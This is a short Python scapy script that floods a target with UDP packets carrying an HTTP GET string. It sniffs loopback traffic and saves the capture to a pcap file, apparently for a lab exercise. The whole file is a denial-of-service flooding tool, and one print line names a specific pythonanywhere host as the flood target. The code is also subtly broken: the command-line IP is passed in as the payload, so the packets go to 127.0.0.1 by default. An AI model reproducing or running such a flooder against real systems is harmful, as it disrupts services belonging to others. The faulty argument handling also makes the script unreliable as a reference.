from scapy.all import *
import sys
import os
import time
import netifaces


def UDP_Flooding(payload_data,dest_ip="127.0.0.1",src_port=8010,target_port=8003,num_pkts_send=1000,delay=0.001):
    print("Initializing Sniffer...")
    sniffer=AsyncSniffer(
        iface="lo",
        filter=f"udp and dst host {dest_ip} and port {target_port}",
        store=True
    )
    sniffer.start()
    time.sleep(1)

    print(f"Sending UDP flood to priyanshu23.pythonanywhere.com")
    packets=[]
    http_payload = f"GET {payload_data} HTTP/1.1\r\nHost: {dest_ip}\r\n\r\n"

    for i in range(num_pkts_send):
        src_ip=netifaces.ifaddresses("wlp1s0")[netifaces.AF_INET][0]['addr']

        ip_pkt=IP(dst=dest_ip,src=src_ip)
        udp_pkt=UDP(sport=src_port,dport=target_port)
        payload=Raw(load=http_payload)

        pkt=ip_pkt/udp_pkt/payload
        send(pkt,verbose=0)
        packets.append(pkt)

        if (i+1)%100==0:
            print(f"{i+1} UDP packets send..")

        time.sleep(delay)

    print(f"Send {num_pkts_send} UDP packets to {dest_ip}")

    print("Stopping Sniffer...")
    sniffer.stop()

    response=sniffer.results

    if response:
        print(f"Packets received: {len(response)}")
        response[0].summary()
        response[0].show()

        all_pkts=response

    else:
        print("No response received from server...")
        all_pkts=packets

    print("Creating PCAP file..")
    print("Deleting previous PCAP file..")
    if os.path.exists("analysis.pcap"):
        os.remove("analysis.pcap")

    wrpcap("analysis.pcap",all_pkts)
    print("PCAP file created successfully....")



if __name__=="__main__":
    argv=sys.argv
    if len(argv)!=2:
        raise ValueError("Usage: sudo python3 udp_flooding.py destination_ip")

    dest_ip=argv[-1]
    UDP_Flooding(dest_ip)

